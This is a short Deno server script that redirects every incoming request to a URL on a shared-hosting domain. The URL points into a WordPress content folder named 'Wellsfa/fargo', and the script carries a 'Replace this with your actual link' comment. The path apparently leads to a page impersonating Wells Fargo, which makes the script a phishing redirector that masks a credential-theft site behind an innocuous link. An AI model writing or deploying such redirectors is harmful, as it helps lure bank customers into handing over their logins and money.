import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "https://vsi.dyz.mybluehost.me/demo/wp-content/Wellsfa/fargo/", // Replace this with your actual link
    },
  });
});
